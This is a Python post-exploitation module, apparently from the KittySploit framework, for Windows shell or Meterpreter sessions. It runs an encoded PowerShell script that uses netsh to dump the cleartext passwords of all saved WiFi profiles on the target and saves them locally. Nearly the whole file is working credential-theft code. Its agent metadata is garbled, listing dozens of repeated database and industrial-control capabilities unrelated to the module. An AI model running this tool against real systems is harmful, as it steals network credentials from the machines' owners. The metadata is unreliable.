#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Extract saved WiFi profile keys from a Windows shell or Meterpreter session using
netsh wlan, then display and save the results under ./output.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows Gather WiFi Keys",
        "description": (
            "List saved WLAN profiles and extract cleartext PSKs with "
            "'netsh wlan show profile key=clear' on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    save_local = OptBool(True, "Save wlankeys.txt under ./output", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_script(self) -> str:
        return r"""
function Get-WiFiKeys {
    [CmdletBinding()]
    Param()

    $profileLines = netsh wlan show profiles 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "netsh wlan show profiles failed: $($profileLines -join ' ')"
    }

    $profileNames = $profileLines | Where-Object {
        $_ -match 'All User Profile|Profil Tous les utilisateurs|Perfil de todos los usuarios|Benutzerprofil'
    } | ForEach-Object {
        if ($_ -match ':\s*(.+)\s*$') { $matches[1].Trim() }
    } | Where-Object { $_ }

    if (-not $profileNames) {
        Write-Output "No saved WiFi profiles found for the current user."
        return
    }

    $sections = New-Object System.Collections.Generic.List[string]
    foreach ($network in $profileNames) {
        $detail = netsh wlan show profile name="$network" key=clear 2>&1
        if ($LASTEXITCODE -ne 0) {
            $sections.Add("=== Profile: $network (failed) ===`n$detail")
            continue
        }
        $sections.Add("=== Profile: $network ===`n$detail")
    }

    $sections -join "`n`n"
}
$ErrorActionPreference = 'Stop'
Get-WiFiKeys
"""

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False

        netsh_check = self._execute_cmd("where netsh")
        if not netsh_check or "netsh" not in netsh_check.lower():
            print_error("netsh.exe is not available on the target")
            return False

        wlan_check = self._execute_cmd("netsh wlan show interfaces")
        if wlan_check and re.search(r"(not supported|not available|not present|n.est pas)", wlan_check, re.I):
            print_warning("WLAN stack may be unavailable on this host")
        return True

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"wifi_keys_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotCompatible, "WiFi key extraction prerequisites not met")

        print_status("Extracting saved WiFi profile keys...")
        result = self._run_powershell(self._powershell_script())

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned by Get-WiFiKeys")

        if re.search(r"netsh wlan show profiles failed", result, re.I):
            print_error(result)
            raise ProcedureError(FailureType.NotCompatible, result)

        if re.search(r"No saved WiFi profiles found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            rel = os.path.join(".", local_path)
            print_success(f"WiFi keys saved to {rel}")

        print_success("WiFi key extraction completed")
        print_info(result)
        return True
